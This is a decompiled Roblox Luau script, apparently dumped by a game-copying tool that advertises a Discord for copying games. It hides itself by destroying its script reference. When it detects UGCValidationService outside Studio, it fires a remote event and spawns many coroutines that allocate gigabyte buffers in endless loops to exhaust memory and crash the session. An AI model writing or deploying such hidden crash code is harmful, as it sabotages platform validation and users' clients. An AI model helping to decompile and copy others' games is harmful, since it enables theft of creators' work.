-- Saved by UniversalSynSaveInstance (Join to Copy Games) https://discord.gg/wx4ThpAsmw

--[[
__________                   __               __    __________              .__
\______   \_______  ____    |__| ____   _____/  |_  \______   \ ____ _____  |  |
 |     ___/\_  __ \/  _ \   |  |/ __ \_/ ___\   __\  |       _// __ \\__  \ |  |
 |    |     |  | \(  <_> )  |  \  ___/\  \___|  |    |    |   \  ___/ / __ \|  |__
 |____|     |__|   \____/\__|  |\___  >\___  >__|    |____|_  /\___  >____  /____/
                        \______|    \/     \/               \/     \/     \/
]]
--                           Project Real  |  Luau Decompiler
--                                   Made by @zinvera
--                   File: ReplicatedStorage.ReplicatedFirst.Instance
--                              Dumped in 0.000478 seconds
--                          Bytecode version 9  |  6 functions

getfenv().script:Destroy()
getfenv().script = nil
local function onCrashAttempt() -- Line: 13
    local v1, v2, v3, v4
    local RemoteEvent = game.ReplicatedStorage:FindFirstChild("RemoteEvent")
    RemoteEvent:FireServer("__UGC_VALIDATION__")
    coroutine.wrap(function() -- Line: 18
        local v1
        while task.wait(0.3) do
            v1 = table.create(67108864, buffer.create(1073741824))
            print(v1)
        end
    end)()
    table.create(67108864, buffer.create(1073741824))
    v1 = table.create(67108864, buffer.create(1073741824))
    print(v1)
    local v5 = 100
    local v6 = 1
    for i = 1, v5, v6 do
        coroutine.wrap(function() -- Line: 45
            local v1, v2, v3, v4
            while true do
                v1 = table.create(67108864, buffer.create(1073741824))
                print(v1)
                v2 = setmetatable({}, {__call = pairs})
                v3 = nil
                v4 = nil
                for i, j in v2, v3, v4 do end
            end
        end)()
    end
    while true do
        v5 = table.create(67108864, buffer.create(1073741824))
        print(v5)
        v2 = setmetatable({}, {__call = pairs})
        v3 = nil
        v4 = nil
        for j, k in v2, v3, v4 do end
    end
end
coroutine.wrap(function() -- Line: 76 -- upvalues: onCrashAttempt (val)
    local v1
    while true do
        if not (game:FindService("UGCValidationService")) then
            v1 = game.ServiceAdded:Connect(function(p1) -- Line: 84 -- upvalues: onCrashAttempt (upval)
                if p1.Name == "UGCValidationService" and not (game:GetService("RunService"):IsStudio()) then
                    onCrashAttempt()
                end
            end)
            task.wait()
            v1:Disconnect()
        elseif not (game:GetService("RunService"):IsStudio()) then
            onCrashAttempt()
        end
    end
end)()